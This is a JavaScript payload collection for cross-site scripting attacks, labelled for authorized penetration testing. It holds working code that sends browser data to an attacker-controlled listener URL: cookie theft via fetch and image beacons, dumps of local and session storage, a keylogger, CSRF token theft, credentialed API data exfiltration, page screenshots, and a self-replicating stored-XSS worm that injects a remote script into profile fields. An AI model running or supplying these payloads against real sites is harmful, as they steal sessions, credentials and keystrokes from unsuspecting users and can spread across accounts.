// XSS Exfiltration Payloads
// For authorized penetration testing only
// Replace ATTACKER_URL with your controlled server

const ATTACKER = 'https://YOUR_LISTENER_URL';

// =========================================
// 1. Cookie Theft
// =========================================

fetch(`${ATTACKER}/c?d=${encodeURIComponent(document.cookie)}`);

// Image beacon — avoids CORS preflight
new Image().src = `${ATTACKER}/c?d=${encodeURIComponent(document.cookie)}`;

// =========================================
// 2. Session Token from localStorage
// =========================================

const data = {
  ls: JSON.stringify(localStorage),
  ss: JSON.stringify(sessionStorage),
  cookie: document.cookie,
  origin: location.origin
};
fetch(`${ATTACKER}/exfil`, { method: 'POST', body: JSON.stringify(data) });

// =========================================
// 3. Keylogger
// =========================================

let buf = '';
document.addEventListener('keypress', e => {
  buf += e.key;
  if (buf.length > 50) {
    fetch(`${ATTACKER}/keys?d=${encodeURIComponent(buf)}`);
    buf = '';
  }
});

// =========================================
// 4. CSRF Token Theft (for chaining)
// =========================================

const token = document.querySelector('meta[name="csrf-token"]')?.content
  || document.querySelector('input[name="_token"]')?.value
  || document.querySelector('input[name="csrf"]')?.value;

fetch(`${ATTACKER}/csrf?t=${encodeURIComponent(token)}&url=${location.href}`);

// =========================================
// 5. Credentialed API Request Exfil
// =========================================
// Requires CORS misconfiguration on target API (Access-Control-Allow-Credentials: true
// and Access-Control-Allow-Origin reflecting the request origin)

fetch('/api/user/profile', { credentials: 'include' })
  .then(r => r.json())
  .then(d => fetch(`${ATTACKER}/api`, {
    method: 'POST',
    body: JSON.stringify(d)
  }));

// =========================================
// 6. Full Page Screenshot via Canvas
// =========================================
// Requires html2canvas: https://github.com/niklasvh/html2canvas

html2canvas(document.body).then(canvas => {
  canvas.toBlob(blob => {
    const fd = new FormData();
    fd.append('screenshot', blob, 'page.png');
    fetch(`${ATTACKER}/screenshot`, { method: 'POST', body: fd });
  });
});

// =========================================
// 7. XSS Worm Skeleton (Stored XSS propagation)
// =========================================
// Self-replicating: injects payload into user-controlled profile fields
// to spread to other users who view the profile

async function propagate() {
  const payload = `<script src="${ATTACKER}/xss.js"><\/script>`;
  const csrf = document.querySelector('[name="csrf_token"]')?.value;

  await fetch('/api/profile', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrf },
    body: JSON.stringify({ bio: payload })
  });
}

// propagate(); // Uncomment only in authorized worm testing
